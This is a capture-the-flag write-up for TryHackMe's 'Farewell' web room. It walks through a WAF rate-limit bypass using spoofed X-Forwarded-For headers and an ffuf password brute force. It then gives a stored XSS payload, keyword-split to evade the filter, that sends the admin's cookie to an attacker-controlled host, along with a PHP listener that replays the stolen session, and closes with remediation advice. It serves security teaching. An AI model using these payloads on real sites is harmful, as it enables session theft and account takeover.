
# Farewell — TryHackMe Writeup

> **Room:** [Farewell](https://tryhackme.com/room/farewell) · **Difficulty:** Hard (MAX)
> **Category:** Web / Red Teaming · **Author of writeup:** 0xnyx
> **Goal:** Bypass the WAF and obtain admin access to the Farewell web app.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the methodology.

---

## Overview

Farewell is a web challenge built around a **WAF (Web Application Firewall)** that
protects a message-board style app. Users sign in, leave a final "farewell message",
and an admin reviews every submission from a separate admin panel.

Two flags: one after logging in as a normal user, one after reaching admin access.

The whole room is about **bypassing the WAF** — first its IP-based rate limiting, then
its content filter that blocks XSS payloads.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set        <-- cookie readable from JavaScript
|_http-title: Farewell — Login
```

Key takeaways:
- Only SSH + HTTP are exposed.
- `PHPSESSID` has **no `HttpOnly` flag** → a successful XSS can read `document.cookie`.

---

## 2. Mapping the app

The login page loads `check.js`, which POSTs credentials to `/auth.php`:

```js
const res = await fetch('/auth.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: form.toString()           // username + password
});
// server returns JSON for both success and failure
if (data.user && data.user.password_hint) { showHint("Invalid password against the user"); }
```

Interesting: on a **failed** login the server still returns the target user object,
**including a `password_hint`** — a built-in username-enumeration + hint oracle.

### The WAF

Sending the request with `curl` returns a `403 — WAF is Active` page. The WAF fingerprints
non-browser traffic, so we add browser-like headers:

```bash
-H "User-Agent: Mozilla/5.0" \
-H "Referer: http://<TARGET>/" \
-H "Origin: http://<TARGET>" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: application/x-www-form-urlencoded"
```

With those headers a single request works and returns the JSON user object with its
`password_hint` field.

### WAF rate limit

Firing requests in a loop quickly triggers the WAF again (~9 requests per window).
It keys the limit on the **client IP**, which the app trusts from `X-Forwarded-For`.
Rotating that header per request bypasses the rate limit entirely:

```bash
-H "X-Forwarded-For: 203.0.$RANDOM.$RANDOM"
```

---

## 3. User flag — targeted brute force

Valid usernames leak in the home-page ticker ("<user> posted a message …").
Querying each through the hint oracle returns a per-user hint. One user's hint points to
a short, highly constrained password space (a well-known city name followed by four
digits) — about 10,000 candidates, which is trivially brute-forceable, especially with
`X-Forwarded-For` rotation keeping the WAF rate-limit from ever firing:

```bash
# build the candidate list (city + 4 digits) and a matching list of random IPs
seq -w 0 9999 | sed 's/^/<CITY>/' > pw.txt
seq 1 10000 | awk '{print "13."int(rand()*254)+1"."int(rand()*254)+1"."int(rand()*254)+1}' > ips.txt

ffuf -w pw.txt:PASS -w ips.txt:IP -mode pitchfork \
  -u http://<TARGET>/auth.php -X POST \
  -H "User-Agent: Mozilla/5.0" -H "Referer: http://<TARGET>/" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -d "username=<USER>&password=PASS" \
  -fr "auth_failed" -t 30
```

The one response that doesn't contain `auth_failed` reveals the password. Logging in
returns `{"success":true,"redirect":"/dashboard.php"}`, and the dashboard shows the
**user flag**.

---

## 4. Admin flag — WAF-bypass stored XSS

The dashboard has a `farewell_message` form, and the story tells us the **admin reviews
every submission** from the admin panel (`/admin.php`, a separate password-protected page).
This is a classic **stored XSS → admin bot** setup.

Probing shows the WAF blocks obvious XSS but misses one tag:

| Payload | Result |
|---------|--------|
| normal text | allowed |
| `<script>…</script>` | blocked |
| `<ScRiPt>…` (case) | blocked |
| `<img src=x onerror=…>` | blocked |
| `<svg onload=…>` | blocked |
| **`<body onload=…>`** | **allowed** |
| `fetch` (keyword) | blocked |
| `document.cookie` (keyword) | blocked |

So `<body onload>` survives the tag filter, but `fetch` and `document.cookie` are blocked
as keywords. Break them with string concatenation so the raw keywords never appear:

```html
<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>
```

This payload passes the WAF.

### Catcher that auto-uses the stolen cookie

Sessions rotate quickly, so the listener grabs the admin cookie and immediately re-uses it
against `/admin.php` to pull the flag before it expires:

```php
<?php
$qs = $_SERVER['QUERY_STRING'] ?? '';
if ($qs) {
    $sess = trim(str_replace("PHPSESSID=","",urldecode(preg_replace('/^c=/','',$qs))));
    $ctx = stream_context_create(['http'=>['header'=>
        "Cookie: PHPSESSID=$sess\r\nUser-Agent: Mozilla/5.0\r\nX-Forwarded-For: 13.9.9.9\r\n"]]);
    $r = @file_get_contents("http://<TARGET>/admin.php", false, $ctx);
    if (preg_match('/THM\{[^}]*\}/', $r, $m)) fwrite(STDERR, "\n[+] flag captured\n");
}
echo "ok";
```

```bash
php -S 0.0.0.0:8000 catcher.php
```

### Fire it

Submit the payload as the farewell message (as the normal user):

```bash
curl -s -b cookies.txt \
  -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 13.5.5.5" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST http://<TARGET>/dashboard.php \
  --data-urlencode 'farewell_message=<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>'
```

When the admin reviews messages, the XSS fires in their browser, the catcher receives the
admin `PHPSESSID`, re-requests `/admin.php`, and captures the **admin flag**.

---

## Lessons

- **`X-Forwarded-For` rotation** defeats an IP-based WAF rate limit when the app trusts that header.
- A login endpoint that returns a **password hint** is a username-enumeration oracle — use it to pick targeted, crackable users instead of running rockyou blindly.
- **WAF content-filter bypass:** replace a blocked tag with an allowed one (`<body onload>` instead of `<script>`/`<img onerror>`), and split blocked keywords with string concat (`window["fe"+"tch"]`, `document["coo"+"kie"]`).
- **Stored XSS + admin bot + `HttpOnly` off** = session theft; auto-using the stolen cookie beats fast-rotating sessions.

## Remediation

- Don't trust `X-Forwarded-For` for rate limiting; key on the real connection IP.
- Never return password hints or distinguish valid/invalid usernames in auth responses.
- Rate-limit and lock accounts on repeated failures.
- Output-encode user content; use a strict CSP; set `HttpOnly` (and `Secure`) on session cookies.
- A WAF is defense-in-depth, not a substitute for encoding and parameterization.

---

*Write-up for [TryHackMe — Farewell](https://tryhackme.com/room/farewell).*
